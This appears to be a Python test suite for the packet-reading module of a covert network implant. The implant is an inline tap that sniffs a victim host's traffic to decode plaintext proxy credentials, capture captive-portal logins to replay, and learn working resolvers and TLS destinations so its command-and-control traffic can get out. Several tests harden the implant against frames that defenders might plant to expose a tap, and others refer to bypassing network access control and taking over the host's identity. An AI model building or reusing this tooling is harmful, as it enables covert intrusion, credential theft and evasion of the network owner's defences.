#!/usr/bin/env python3
"""What the implant is uniquely placed to see, and what it makes of it.

The implant is an inline tap between a switch port and a host, so it can
watch what gets out of that host *working* -- which is evidence nobody in
this repository collects today. These tests are about the reading, not
about the capture: every one of them hands `Evidence.observe` a packet and
asks what the evidence now says.

**Nothing `observe` is given may raise.** It runs on a capture thread on a
13 W device, and a parse error on a malformed frame that cost the scout its
thread would cost the implant the evidence it exists to collect. So the
malformed cases below are not politeness: they are the contract.
"""

import sys
import unittest
from pathlib import Path

from scapy.all import DNS, DNSQR, DNSRR, IP, TCP, UDP, Ether, Raw

REPO = Path(__file__).resolve().parents[2]
sys.path.insert(0, str(REPO))

from software.scout import evidence as evidence_mod  # noqa: E402


def _tcp(src, dst, sport, dport, payload=b""):
    packet = (Ether(src="aa:bb:cc:dd:ee:ff", dst="11:22:33:44:55:66")
              / IP(src=src, dst=dst) / TCP(sport=sport, dport=dport))
    return packet / Raw(payload) if payload else packet


class EvidenceCase(unittest.TestCase):
    """One fresh `Evidence` per test, plus the packets they are made of."""

    HOST = "10.0.0.50"
    GATEWAY = "10.0.0.1"

    def setUp(self):
        self.evidence = evidence_mod.Evidence()

    # ── the packets ──

    def eapol(self):
        # 0x888E is the ether type nac_bypass.py forwards so the downstream
        # device stays authenticated; one frame of it is the whole evidence.
        return (Ether(src="aa:bb:cc:dd:ee:ff", dst="01:80:c2:00:00:03",
                      type=0x888E) / Raw(b"\x01\x01\x00\x00"))

    def http_request(self, method, host, target, body=b"", headers=(),
                     dport=80):
        lines = ["%s %s HTTP/1.1" % (method, target), "Host: %s" % host]
        lines.extend(headers)
        head = ("\r\n".join(lines) + "\r\n\r\n").encode()
        return _tcp(self.HOST, self.GATEWAY, 44444, dport, head + body)

    def http_response(self, status, headers=(), sport=80, body=b""):
        lines = ["HTTP/1.1 %d %s" % (status, "OK" if status == 200 else "Found")]
        lines.extend(headers)
        head = ("\r\n".join(lines) + "\r\n\r\n").encode()
        return _tcp(self.GATEWAY, self.HOST, sport, 44444, head + body)

    def refused_proxy(self, evidence=None, dport=3128):
        """Play the CONNECT and the 407 a borrowable credential needs.

        A `Proxy-Authorization` header on its own is one frame anybody on
        the tapped segment can send, and the borrow rung answers a
        *refusal* -- so the refusal is the precondition, and every test
        about a credential plays it.
        """
        target = self.evidence if evidence is None else evidence
        target.observe(self.http_request("CONNECT", "proxy.lan:%d" % dport,
                                         "a:443", dport=dport))
        target.observe(self.http_response(
            407, ['Proxy-Authenticate: Basic realm="corp"'], sport=dport))

    def dns_query(self, name, resolver, mac="aa:bb:cc:dd:ee:ff"):
        # The sender is named rather than left to scapy's default, because
        # every one of these tests is now about which side of the bridge a
        # frame came from.
        return (Ether(src=mac, dst="11:22:33:44:55:66")
                / IP(src=self.HOST, dst=resolver)
                / UDP(sport=55555, dport=53)
                / DNS(rd=1, qd=DNSQR(qname=name)))

    def dns_answer(self, name, resolver, address="93.184.216.34"):
        return (Ether(src="11:22:33:44:55:66", dst="aa:bb:cc:dd:ee:ff")
                / IP(src=resolver, dst=self.HOST)
                / UDP(sport=53, dport=55555)
                / DNS(qr=1, qd=DNSQR(qname=name),
                      an=DNSRR(rrname=name, rdata=address)))

    def client_hello(self, sni):
        return _tcp(self.HOST, self.GATEWAY, 44445, 443,
                    _client_hello_bytes(sni))

    def server_hello(self):
        # A record of type 22 (handshake) from the server is all this needs:
        # the question is whether the handshake got an answer, not what the
        # answer said.
        return _tcp(self.GATEWAY, self.HOST, 443, 44445,
                    b"\x16\x03\x03\x00\x04\x02\x00\x00\x00")


def _client_hello_bytes(sni):
    """A TLS ClientHello record carrying exactly one server_name extension.

    Built by hand rather than with scapy's TLS layer: the scout parses the
    payload bytes itself (so that a truncated record is a packet ignored
    rather than an exception on the capture thread), and a test that built
    the record with a different library would be testing that library's
    agreement with this parser instead of the parser.
    """
    name = sni.encode()
    server_name = b"\x00" + len(name).to_bytes(2, "big") + name
    name_list = len(server_name).to_bytes(2, "big") + server_name
    extension = b"\x00\x00" + len(name_list).to_bytes(2, "big") + name_list
    extensions = len(extension).to_bytes(2, "big") + extension
    body = (b"\x03\x03" + b"\x00" * 32      # version, random
            + b"\x00"                        # no session id
            + b"\x00\x02\x13\x01"            # one cipher suite
            + b"\x01\x00"                    # one compression method
            + extensions)
    handshake = b"\x01" + len(body).to_bytes(3, "big") + body
    return b"\x16\x03\x01" + len(handshake).to_bytes(2, "big") + handshake


class TestTheTwoDeadFlags(EvidenceCase):
    """`dot1x_seen` and `portal_answered`, which nothing has ever set."""

    def test_an_eapol_frame_sets_dot1x_seen(self):
        self.assertFalse(self.evidence.dot1x_seen)
        self.evidence.observe(self.eapol())
        self.assertTrue(self.evidence.dot1x_seen)
        self.assertEqual(self.evidence.flags(), ["dot1x_seen"])

    def test_ordinary_traffic_does_not_set_dot1x_seen(self):
        self.evidence.observe(self.dns_query("example.com", "10.0.0.2"))
        self.assertFalse(self.evidence.dot1x_seen)
        self.assertEqual(self.evidence.flags(), [])

    def test_a_redirect_alone_does_not_set_portal_answered(self):
        # A redirect is a portal noticed, not a portal answered. The flag
        # says the host got *past* one, which is what makes it worth
        # borrowing; a rung that replayed an unanswered redirect would
        # spend an attempt on a login page.
        self.evidence.observe(self.http_response(
            302, ["Location: http://portal.lan/login"]))
        self.assertIsNone(self.evidence.portal)
        self.assertFalse(self.evidence.portal_answered)

    def test_a_redirect_then_an_answered_post_sets_portal_answered(self):
        self.evidence.observe(self.http_response(
            302, ["Location: http://portal.lan/login"]))
        self.evidence.observe(self.http_request(
            "POST", "portal.lan", "/login", body=b"user=guest&accept=1",
            headers=["Content-Type: application/x-www-form-urlencoded"]))
        self.evidence.observe(self.http_response(200))
        self.assertTrue(self.evidence.portal_answered)
        self.assertEqual(self.evidence.portal["url"],
                         "http://portal.lan/login")
        self.assertEqual(self.evidence.portal["body"], "user=guest&accept=1")
        self.assertEqual(self.evidence.portal["content_type"],
                         "application/x-www-form-urlencoded")
        self.assertEqual(self.evidence.flags(), ["portal_answered"])

    def test_a_post_to_somewhere_else_is_not_a_portal_answer(self):
        self.evidence.observe(self.http_response(
            302, ["Location: http://portal.lan/login"]))
        self.evidence.observe(self.http_request(
            "POST", "intranet.lan", "/search", body=b"q=1"))
        self.evidence.observe(self.http_response(200))
        self.assertFalse(self.evidence.portal_answered)
        self.assertIsNone(self.evidence.portal)

    def test_both_flags_are_reported_in_the_records_bit_order(self):
        # The order the operator reads them in dns_rescue.py, not
        # alphabetically: `_egress_check_flag`'s messages already make that
        # promise about the live flags.
        self.evidence.observe(self.http_response(
            302, ["Location: http://portal.lan/login"]))
        self.evidence.observe(self.http_request(
            "POST", "portal.lan", "/login", body=b"ok=1"))
        self.evidence.observe(self.http_response(200))
        self.evidence.observe(self.eapol())
        self.assertEqual(self.evidence.flags(),
                         ["dot1x_seen", "portal_answered"])


class TestTheHostsProxy(EvidenceCase):
    """What the host proves about getting out through a proxy."""

    def test_a_connect_request_records_the_proxy(self):
        self.evidence.observe(self.http_request(
            "CONNECT", "proxy.lan:3128", "intranet.lan:443", dport=3128))
        self.assertEqual(self.evidence.proxies, ["10.0.0.1:3128"])

    def test_the_same_proxy_twice_is_recorded_once(self):
        for _ in range(3):
            self.evidence.observe(self.http_request(
                "CONNECT", "proxy.lan:3128", "intranet.lan:443", dport=3128))
        self.assertEqual(self.evidence.proxies, ["10.0.0.1:3128"])

    def test_a_wpad_lookup_records_the_name_it_asked_for(self):
        self.evidence.observe(self.dns_query("wpad.corp.lan", "10.0.0.2"))
        self.evidence.observe(self.dns_answer("wpad.corp.lan", "10.0.0.2"))
        self.assertIn("wpad.corp.lan", self.evidence.wpad)

    def test_a_pac_fetch_records_its_url(self):
        self.evidence.observe(self.http_request(
            "GET", "wpad.corp.lan", "/wpad.dat"))
        self.assertIn("http://wpad.corp.lan/wpad.dat", self.evidence.pac)


class TestTheHostsResolver(EvidenceCase):
    """Which resolver the host uses, and whether it answers."""

    def test_an_answered_query_counts_its_resolver(self):
        self.evidence.observe(self.dns_query("example.com", "10.0.0.2"))
        self.evidence.observe(self.dns_answer("example.com", "10.0.0.2"))
        self.assertEqual(self.evidence.resolvers, {"10.0.0.2": 1})

    def test_an_unanswered_query_counts_nothing(self):
        # The question the rung needs answered is "does this resolver
        # answer", so a query with no reply is not evidence for it.
        self.evidence.observe(self.dns_query("example.com", "10.0.0.2"))
        self.assertEqual(self.evidence.resolvers, {})

    def test_a_response_with_no_answer_section_counts_nothing(self):
        empty = (Ether() / IP(src="10.0.0.2", dst=self.HOST)
                 / UDP(sport=53, dport=55555)
                 / DNS(qr=1, rcode=3, qd=DNSQR(qname="nope.lan")))
        self.evidence.observe(self.dns_query("nope.lan", "10.0.0.2"))
        self.evidence.observe(empty)
        self.assertEqual(self.evidence.resolvers, {})

    def test_two_resolvers_are_counted_apart(self):
        for resolver in ("10.0.0.2", "10.0.0.3", "10.0.0.2"):
            self.evidence.observe(self.dns_query("example.com", resolver))
            self.evidence.observe(self.dns_answer("example.com", resolver))
        self.assertEqual(self.evidence.resolvers,
                         {"10.0.0.2": 2, "10.0.0.3": 1})


class TestTheHostsWorkingTlsDestinations(EvidenceCase):
    """The target a louder rung aims at: somewhere the host proves works."""

    def test_a_handshake_that_completed_records_its_sni(self):
        self.evidence.observe(self.client_hello("updates.example.com"))
        self.assertEqual(self.evidence.tls_destinations, [])
        self.evidence.observe(self.server_hello())
        self.assertEqual(self.evidence.tls_destinations,
                         ["updates.example.com"])

    def test_a_client_hello_with_no_answer_records_nothing(self):
        # "The host proves this works" is the whole value of this line. A
        # ClientHello nobody answered proves the opposite.
        self.evidence.observe(self.client_hello("blocked.example.com"))
        self.assertEqual(self.evidence.tls_destinations, [])

    def test_a_truncated_client_hello_records_nothing_and_raises_nothing(self):
        raw = _client_hello_bytes("updates.example.com")
        for cut in (3, 6, 10, 44, len(raw) - 2):
            with self.subTest(cut=cut):
                fresh = evidence_mod.Evidence()
                fresh.observe(_tcp(self.HOST, self.GATEWAY, 1, 443, raw[:cut]))
                fresh.observe(self.server_hello())
                self.assertEqual(fresh.tls_destinations, [])


class TestTheCredentialsTheHostHandsOver(EvidenceCase):
    """Plaintext credentials on the wire, for the borrow rung."""

    def test_a_basic_proxy_authorization_header_is_recorded_decoded(self):
        self.refused_proxy()
        self.evidence.observe(self.http_request(
            "CONNECT", "proxy.lan:3128", "intranet.lan:443", dport=3128,
            headers=["Proxy-Authorization: Basic Y29ycFxhbGljZTpzM2NyZXQ="]))
        self.assertEqual(len(self.evidence.credentials), 1)
        found = self.evidence.credentials[0]
        self.assertEqual(found["kind"], "proxy-basic")
        self.assertEqual(found["user"], "corp\\alice")
        self.assertEqual(found["secret"], "s3cret")
        self.assertEqual(found["where"], "10.0.0.1:3128")

    def test_an_ntlm_proxy_authorization_header_records_no_secret(self):
        # NTLM is a challenge-response, so the header carries no password
        # to borrow. Recorded as what it is, so the rung can decline with a
        # reason rather than select a credential with an empty secret.
        self.refused_proxy()
        self.evidence.observe(self.http_request(
            "CONNECT", "proxy.lan:3128", "intranet.lan:443", dport=3128,
            headers=["Proxy-Authorization: NTLM TlRMTVNTUAAB"]))
        self.assertEqual([c["kind"] for c in self.evidence.credentials],
                         ["proxy-ntlm"])
        self.assertEqual(self.evidence.credentials[0]["secret"], "")

    def test_the_same_credential_twice_is_recorded_once(self):
        self.refused_proxy()
        for _ in range(2):
            self.evidence.observe(self.http_request(
                "CONNECT", "proxy.lan:3128", "intranet.lan:443", dport=3128,
                headers=["Proxy-Authorization: Basic Y29ycFxhbGljZTpzM2NyZXQ="]))
        self.assertEqual(len(self.evidence.credentials), 1)

    def test_an_unreadable_basic_header_records_nothing(self):
        for value in ("Basic", "Basic !!!!", "Basic " + "A" * 5,
                      "Basic bm9jb2xvbg=="):
            with self.subTest(value=value):
                fresh = evidence_mod.Evidence()
                self.refused_proxy(fresh)
                fresh.observe(self.http_request(
                    "CONNECT", "proxy.lan:3128", "a:443", dport=3128,
                    headers=["Proxy-Authorization: " + value]))
                self.assertEqual(fresh.credentials, [])


class TestTheEvidenceIsAdversaryWritable(EvidenceCase):
    """Anybody on the tapped segment can write to this wire.

    A review found the sharp end of it: the borrow rung makes the proxy a
    frame named the implant's own proxy, and replays the request a frame
    said the host got past. Three forged frames therefore pointed the
    implant's C2 at an attacker's host, or made it POST an attacker's body
    to an attacker's URL -- and the same frames set `portal_answered`,
    which lowers the borrow rung's detection probability and moves its
    crossing to hour zero. The evidence that moves the gate was forgeable
    in the loud direction.

    The design never considered this: it treats "what the host proves
    works" as ground truth throughout. It is not ground truth; it is
    unauthenticated frames. What follows is the narrowing, and each test
    is a frame sequence a defender who suspected a tap could plant.
    """

    def forged(self, where="203.0.113.9:3128", mac="de:ad:be:ef:00:01"):
        """The whole sequence, from a sender that is not the host.

        A review found the `407` precondition does not bind a forger,
        because the forger sends the 407 too. So the frames have to come
        from the host the tap learned, and the proxy has to be on the
        network the implant is on.
        """
        host, port = where.split(":")

        def connect(*headers):
            lines = ["CONNECT a:443 HTTP/1.1", "Host: %s" % where]
            lines.extend(headers)
            return ("\r\n".join(lines) + "\r\n\r\n").encode()

        head = connect()
        auth = connect(
            "Proxy-Authorization: Basic QURNSU5cc3ZjOlN1bW1lcg==")
        frame = (Ether(src=mac, dst="11:22:33:44:55:66")
                 / IP(src="10.0.0.99", dst=host)
                 / TCP(sport=55555, dport=int(port)))
        self.evidence.observe(frame / Raw(head))
        self.evidence.observe(
            (Ether(src="11:22:33:44:55:66", dst=mac)
             / IP(src=host, dst="10.0.0.99")
             / TCP(sport=int(port), dport=55555))
            / Raw(b"HTTP/1.1 407 Proxy Authentication Required\r\n"
                  b"Proxy-Authenticate: Basic realm=\"corp\"\r\n\r\n"))
        self.evidence.observe(frame / Raw(auth))

    def test_the_host_is_the_bridges_own_reading_and_not_the_first_frame(self):
        # The anchor was itself one unauthenticated frame: whoever spoke
        # first became "the host" for the window, and `_udp` latched on
        # any DNS query with no sender check at all -- so four frames
        # bought a borrowable credential *and* blinded the scout to the
        # real host for a window the design says can last a week.
        #
        # It is a wire fact now. The bridge learns which port a MAC is on
        # and a segment peer cannot forge that, so the scout asks the
        # bridge rather than the frame.
        known = evidence_mod.Evidence(host_macs=["aa:bb:cc:dd:ee:ff"])
        known.observe(self.dns_query("evil.test", "10.9.9.53",
                                      mac="de:ad:be:ef:00:01"))
        self.assertIsNone(known.host_mac, "a stranger's query named the host")
        self.assertEqual(known.resolvers, {})

        known.observe(self.http_request("GET", "intranet.lan", "/"))
        self.assertEqual(known.host_mac, "aa:bb:cc:dd:ee:ff")

    def test_without_a_reading_the_first_sender_is_still_taken(self):
        # A host whose bridge cannot be read is not a reason to collect
        # nothing: that is the behaviour this had before, and it is better
        # than a scout that refuses to work. The page says which it is.
        blind = evidence_mod.Evidence(host_macs=None)
        blind.observe(self.dns_query("x.lan", "10.0.0.2"))
        self.assertEqual(blind.host_mac, "aa:bb:cc:dd:ee:ff")

    def test_a_strangers_eapol_does_not_set_the_flag(self):
        # `dot1x_seen` is not evidence-only: it reaches the rescue record,
        # the operator's panel, a policy rule and rung 4's p_detect. One
        # frame from anyone set it.
        known = evidence_mod.Evidence(host_macs=["aa:bb:cc:dd:ee:ff"])
        known.observe(Ether(src="de:ad:be:ef:00:01",
                            dst="01:80:c2:00:00:03", type=0x888E)
                      / Raw(b"\x01\x01\x00\x00"))
        self.assertFalse(known.dot1x_seen)
        known.observe(self.eapol())
        self.assertTrue(known.dot1x_seen)

    def test_a_strangers_resolver_and_wpad_are_not_published(self):
        known = evidence_mod.Evidence(host_macs=["aa:bb:cc:dd:ee:ff"])
        stranger = (Ether(src="de:ad:be:ef:00:01", dst="11:22:33:44:55:66")
                    / IP(src="10.9.9.9", dst="10.9.9.53")
                    / UDP(sport=5555, dport=53)
                    / DNS(rd=1, qd=DNSQR(qname="wpad.evil.test")))
        known.observe(stranger)
        known.observe(Ether(src="11:22:33:44:55:66",
                            dst="de:ad:be:ef:00:01")
                      / IP(src="10.9.9.53", dst="10.9.9.9")
                      / UDP(sport=53, dport=5555)
                      / DNS(qr=1, qd=DNSQR(qname="wpad.evil.test"),
                            an=DNSRR(rrname="wpad.evil.test",
                                     rdata="10.9.9.9")))
        self.assertEqual(known.resolvers, {})
        self.assertEqual(known.wpad, [])

    def test_a_strangers_tls_destination_is_not_published(self):
        known = evidence_mod.Evidence(host_macs=["aa:bb:cc:dd:ee:ff"])
        hello = _client_hello_bytes("evil.test")
        known.observe(Ether(src="de:ad:be:ef:00:01", dst="11:22:33:44:55:66")
                      / IP(src="10.9.9.9", dst="10.9.9.1")
                      / TCP(sport=44445, dport=443) / Raw(hello))
        known.observe(Ether(src="11:22:33:44:55:66", dst="de:ad:be:ef:00:01")
                      / IP(src="10.9.9.1", dst="10.9.9.9")
                      / TCP(sport=443, dport=44445)
                      / Raw(b"\x16\x03\x03\x00\x04\x02\x00\x00\x00"))
        self.assertEqual(known.tls_destinations, [])

    def test_a_second_downstream_device_is_read_as_well(self):
        # The bridge may have learned more than one MAC on that port --
        # a switch, a phone with a PC behind it. All of them are the host
        # side, so all of them count.
        both = evidence_mod.Evidence(
            host_macs=["aa:bb:cc:dd:ee:ff", "de:ad:be:ef:00:01"])
        both.observe(self.dns_query("x.lan", "10.0.0.2",
                                     mac="de:ad:be:ef:00:01"))
        both.observe(self.dns_answer("x.lan", "10.0.0.2"))
        self.assertEqual(both.resolvers, {"10.0.0.2": 1})

    def test_a_forged_sequence_from_another_sender_is_not_borrowed(self):
        # The implant knows which MAC the host behind the tap has, and
        # until now it learned it and used it for nothing. The proxy is on
        # the **local** network here, so this test turns on the sender and
        # nothing else: `_is_local` must not be what refuses it.
        self.evidence.observe(self.http_request("GET", "intranet.lan", "/"))
        self.assertEqual(self.evidence.host_mac, "aa:bb:cc:dd:ee:ff")
        self.forged(where="10.0.0.66:3128")
        self.assertEqual(self.evidence.credentials, [])
        self.assertEqual(self.evidence.proxies, [])

    def test_the_same_sequence_from_the_host_is_borrowed(self):
        # The control for the two tests around it: with the sender right
        # and the address local, the credential *is* taken -- so neither
        # refusal above is passing for the wrong reason.
        self.evidence.observe(self.http_request("GET", "intranet.lan", "/"))
        self.forged(where="10.0.0.66:3128", mac="aa:bb:cc:dd:ee:ff")
        self.assertEqual([c["where"] for c in self.evidence.credentials],
                         ["10.0.0.66:3128"])

    def test_a_proxy_off_the_local_network_is_not_borrowed(self):
        # Even from the host: a proxy at a public address is not this
        # network's proxy, and the rung would point the implant's whole
        # channel at it.
        self.evidence.observe(self.http_request("GET", "intranet.lan", "/"))
        self.forged(mac="aa:bb:cc:dd:ee:ff")
        self.assertEqual(self.evidence.credentials, [])

    def test_the_hosts_own_sequence_is_still_borrowed(self):
        self.evidence.observe(self.http_request("GET", "intranet.lan", "/"))
        self.refused_proxy()
        self.evidence.observe(self.http_request(
            "CONNECT", "proxy.lan:3128", "a:443", dport=3128,
            headers=["Proxy-Authorization: Basic Y29ycFxhbGljZTpzM2NyZXQ="]))
        self.assertEqual([c["where"] for c in self.evidence.credentials],
                         ["10.0.0.1:3128"])

    def test_a_portal_redirect_is_bound_to_the_flow_that_answered_it(self):
        # The commit that narrowed this claimed "the whole
        # redirect/POST/2xx sequence on one flow" and `_portal_host` was
        # global, so a redirect seen on any flow blessed a POST on any
        # other.
        self.evidence.observe(self.http_response(
            302, ["Location: http://10.0.0.1/login"], sport=80))
        other = (Ether(src="aa:bb:cc:dd:ee:ff", dst="11:22:33:44:55:66")
                 / IP(src=self.HOST, dst="10.0.0.1")
                 / TCP(sport=33333, dport=80))
        self.evidence.observe(other / Raw(
            b"POST /x HTTP/1.1\r\nHost: 10.0.0.1\r\n\r\na=1"))
        self.evidence.observe(
            (Ether() / IP(src="10.0.0.1", dst=self.HOST)
             / TCP(sport=80, dport=33333))
            / Raw(b"HTTP/1.1 200 OK\r\n\r\n"))
        self.assertFalse(self.evidence.portal_answered)

    def test_what_the_407s_leave_behind_is_bounded(self):
        # The one container the bounding pass missed, and the fix commit
        # added it: two frames per entry, from anyone on the segment.
        self.evidence.observe(self.http_request("GET", "intranet.lan", "/"))
        for index in range(evidence_mod.MAX_ENTRIES * 4):
            port = 3000 + index
            self.evidence.observe(self.http_request(
                "CONNECT", "proxy.lan:%d" % port, "a:443", dport=port))
            self.evidence.observe(self.http_response(407, sport=port))
        self.assertLessEqual(len(self.evidence._refused_by),
                             evidence_mod.MAX_ENTRIES)

    def test_a_credential_needs_a_proxy_the_host_really_used(self):
        # `Proxy-Authorization` on an ordinary request to an arbitrary
        # host is one frame. Recorded only against a `CONNECT` whose
        # destination the host actually proxied through.
        self.evidence.observe(self.http_request(
            "GET", "intranet.lan", "/",
            headers=["Proxy-Authorization: Basic Y29ycFxhbGljZTpzM2NyZXQ="]))
        self.assertEqual(self.evidence.credentials, [])

    def test_a_credential_needs_the_proxy_to_have_demanded_one(self):
        # A CONNECT with a credential and no 407 in front of it is a frame
        # anybody can send. The rung answers a *refusal*, so the refusal
        # has to have happened.
        self.evidence.observe(self.http_request(
            "CONNECT", "proxy.lan:3128", "a:443", dport=3128,
            headers=["Proxy-Authorization: Basic Y29ycFxhbGljZTpzM2NyZXQ="]))
        self.assertEqual(self.evidence.credentials, [])

    def test_a_credential_answering_a_real_407_is_recorded(self):
        self.evidence.observe(self.http_request(
            "CONNECT", "proxy.lan:3128", "a:443", dport=3128))
        self.evidence.observe(self.http_response(
            407, ["Proxy-Authenticate: Basic realm=\"corp\""], sport=3128))
        self.evidence.observe(self.http_request(
            "CONNECT", "proxy.lan:3128", "a:443", dport=3128,
            headers=["Proxy-Authorization: Basic Y29ycFxhbGljZTpzM2NyZXQ="]))
        self.assertEqual([c["user"] for c in self.evidence.credentials],
                         ["corp\\alice"])

    def test_a_407_from_somewhere_else_does_not_open_the_door(self):
        self.evidence.observe(self.http_request(
            "CONNECT", "proxy.lan:3128", "a:443", dport=3128))
        self.evidence.observe(self.http_response(407, sport=8080))
        self.evidence.observe(self.http_request(
            "CONNECT", "proxy.lan:3128", "a:443", dport=3128,
            headers=["Proxy-Authorization: Basic Y29ycFxhbGljZTpzM2NyZXQ="]))
        self.assertEqual(self.evidence.credentials, [])

    def test_a_portal_at_a_public_address_is_not_recorded(self):
        # A captive portal is on the network the host is being held off,
        # so a redirect to a public *address* is not one: it is a frame
        # pointing the implant at somebody's canary URL.
        for host in ("8.8.8.8", "203.0.113.9", "172.32.0.1", "11.0.0.1"):
            with self.subTest(host=host):
                fresh = evidence_mod.Evidence()
                fresh.observe(self.http_response(
                    302, ["Location: http://%s/burn?id=implant" % host]))
                fresh.observe(self.http_request(
                    "POST", host, "/burn?id=implant", body=b"a=1"))
                fresh.observe(self.http_response(200))
                self.assertFalse(fresh.portal_answered)
                self.assertIsNone(fresh.portal)

    def test_a_portal_named_rather_than_addressed_is_still_recorded(self):
        # And this is a **residual risk**, written down here and in the
        # design's risk table rather than papered over. A real portal
        # usually has a name, this implant cannot resolve one to check
        # where it points, and refusing every name would lose the rung in
        # the enterprise case it exists for. So a forger who names their
        # canary gets a replay. What it costs them is the rest of the
        # sequence: a 302 to that name, a POST on one flow, and a 2xx on
        # the same flow, all on a port the scout is watching.
        fresh = evidence_mod.Evidence()
        fresh.observe(self.http_response(
            302, ["Location: http://canary.attacker.test/burn"]))
        fresh.observe(self.http_request("POST", "canary.attacker.test",
                                        "/burn", body=b"a=1"))
        fresh.observe(self.http_response(200))
        self.assertTrue(fresh.portal_answered)

    def test_a_portal_on_the_local_network_is_recorded(self):
        for host in ("10.0.0.1", "192.168.9.1", "172.16.4.1",
                     "169.254.1.1", "portal.lan"):
            with self.subTest(host=host):
                fresh = evidence_mod.Evidence()
                fresh.observe(self.http_response(
                    302, ["Location: http://%s/login" % host]))
                fresh.observe(self.http_request("POST", host, "/login",
                                                body=b"accept=1"))
                fresh.observe(self.http_response(200))
                self.assertTrue(fresh.portal_answered, host)

    def test_a_portal_body_is_capped(self):
        # A frame can carry 64 KB of form body, and the rung replays it.
        self.evidence.observe(self.http_response(
            302, ["Location: http://portal.lan/login"]))
        self.evidence.observe(self.http_request(
            "POST", "portal.lan", "/login", body=b"x" * 20000))
        self.evidence.observe(self.http_response(200))
        self.assertIsNone(self.evidence.portal,
                          "a body this size is not a portal form")

    def test_the_lists_are_bounded(self):
        # Every container here grows for as long as the implant is dark,
        # which the design's own worst case puts at a week, on a 4 GB
        # device that is bridging at the same time. A review measured
        # 400 MB from 40,000 frames.
        for index in range(evidence_mod.MAX_ENTRIES * 3):
            # More than MAX_ENTRIES *distinct* resolvers, or the cap is
            # never reached and the assertion holds for the wrong reason.
            resolver = "10.%d.%d.%d" % (index // 250, index % 250,
                                        1 + index % 250)
            self.evidence.observe(self.client_hello("h%d.example.com" % index))
            self.evidence.observe(self.server_hello())
            self.evidence.observe(self.dns_query("q%d.lan" % index, resolver))
            self.evidence.observe(self.dns_answer("q%d.lan" % index,
                                                  resolver))
        self.assertLessEqual(len(self.evidence.tls_destinations),
                             evidence_mod.MAX_ENTRIES)
        self.assertLessEqual(len(self.evidence.resolvers),
                             evidence_mod.MAX_ENTRIES)

    def test_what_waits_for_an_answer_is_bounded_too(self):
        # The sharper half: an unanswered query and an unanswered
        # ClientHello are retained while they wait, and on a busy segment
        # most of them are never answered.
        for index in range(evidence_mod.MAX_PENDING * 3):
            self.evidence.observe(self.dns_query("q%d.lan" % index,
                                                 "10.0.0.2"))
            self.evidence.observe(_tcp(self.HOST, self.GATEWAY,
                                       40000 + (index % 20000), 443,
                                       _client_hello_bytes(
                                           "h%d.example.com" % index)))
        self.assertLessEqual(len(self.evidence._dns_pending),
                             evidence_mod.MAX_PENDING)
        self.assertLessEqual(len(self.evidence._tls_pending),
                             evidence_mod.MAX_PENDING)


class TestTheHostsIdentity(EvidenceCase):
    """The MAC and IP rung 4 would take -- the host's, not the implant's."""

    def test_the_first_host_side_sender_is_the_identity(self):
        self.evidence.observe(self.http_request("GET", "intranet.lan", "/"))
        self.assertEqual(self.evidence.host_mac, "aa:bb:cc:dd:ee:ff")
        self.assertEqual(self.evidence.host_ip, self.HOST)

    def test_the_implants_own_traffic_is_not_the_host(self):
        # The scout sniffs `br0`, which carries the beacon's own queries
        # and its own TLS -- so without this the document and the model's
        # prompt could describe the implant to itself, and the trail would
        # name the implant as the identity rung 4 would take.
        mine = evidence_mod.Evidence(own_mac="AA:BB:CC:DD:EE:FF")
        mine.observe(self.http_request("GET", "intranet.lan", "/"))
        self.assertIsNone(mine.host_mac)
        self.assertIsNone(mine.host_ip)

        mine.observe(_tcp(self.HOST, self.GATEWAY, 1, 80,
                          b"GET / HTTP/1.1\r\nHost: x\r\n\r\n")
                     .__class__(bytes(
                         Ether(src="de:ad:be:ef:00:01",
                               dst="11:22:33:44:55:66")
                         / IP(src="10.0.0.77", dst=self.GATEWAY)
                         / TCP(sport=2, dport=80)
                         / Raw(b"GET / HTTP/1.1\r\nHost: x\r\n\r\n"))))
        self.assertEqual(mine.host_mac, "de:ad:be:ef:00:01")
        self.assertEqual(mine.host_ip, "10.0.0.77")


    def test_the_implants_own_requests_are_not_evidence_either(self):
        # Not only "it is not the identity": the frame must contribute
        # nothing at all. Before the host has said anything there is no
        # anchor to compare against -- `host_mac` is None and a build
        # whose bridge cannot be read has no table either -- so without
        # the own-MAC check in `_from_the_host` the beacon's own queries
        # became "a resolver the host proves answers" and its own
        # handshakes became the host's destinations. The scout sniffs
        # `br0`, which carries exactly that traffic.
        mine = evidence_mod.Evidence(own_mac="aa:bb:cc:dd:ee:ff")
        mine.observe(self.dns_query("c2.example.com", "10.0.0.2"))
        mine.observe(self.dns_answer("c2.example.com", "10.0.0.2"))
        mine.observe(self.client_hello("c2.example.com"))
        mine.observe(self.eapol())

        self.assertEqual(mine.resolvers, {})
        self.assertEqual(mine.tls_destinations, [])
        self.assertFalse(mine.dot1x_seen)
        self.assertIsNone(mine.host_mac)


class TestNothingObserveIsGivenMayRaise(EvidenceCase):
    """The contract, because this runs on a capture thread with no guard."""

    def test_every_shape_of_rubbish_leaves_the_evidence_untouched(self):
        before = self.evidence.as_document_fields()
        for packet in (None, object(), b"", b"\x00" * 7, Ether(),
                       Ether() / IP(src=self.HOST, dst=self.GATEWAY),
                       _tcp(self.HOST, self.GATEWAY, 1, 80, b"\xff\xfe\xfd"),
                       _tcp(self.HOST, self.GATEWAY, 1, 80, b"GET"),
                       (Ether() / IP(src=self.HOST, dst="10.0.0.2")
                        / UDP(sport=1, dport=53) / Raw(b"\x01")),
                       self.http_response(302)):
            with self.subTest(packet=repr(packet)[:40]):
                self.evidence.observe(packet)
        self.assertEqual(self.evidence.as_document_fields(), before)

    def test_a_packet_whose_layers_raise_is_ignored(self):
        class Hostile(object):
            def haslayer(self, _layer):
                raise RuntimeError("a layer that bites")

            def __getitem__(self, _layer):
                raise RuntimeError("a layer that bites")

        self.evidence.observe(Hostile())
        self.assertEqual(self.evidence.flags(), [])


class TestTheDocumentFields(EvidenceCase):
    """What Task 3 publishes: JSON-safe, and no secret in it."""

    def test_the_fields_are_json_safe_and_carry_no_secret(self):
        import json
        self.evidence.observe(self.eapol())
        self.refused_proxy()
        self.evidence.observe(self.http_request(
            "CONNECT", "proxy.lan:3128", "a:443", dport=3128,
            headers=["Proxy-Authorization: Basic Y29ycFxhbGljZTpzM2NyZXQ="]))
        fields = self.evidence.as_document_fields()
        text = json.dumps(fields)
        # The credentials live in their own file, 0600, and never in the
        # document the beacon reads -- the document is the handoff, and a
        # handoff carrying passwords is a second place they can be found.
        self.assertNotIn("s3cret", text)
        self.assertEqual(fields["flags"], ["dot1x_seen"])
        self.assertEqual(fields["proxies"], ["10.0.0.1:3128"])
        self.assertEqual(fields["credentials"], 1)


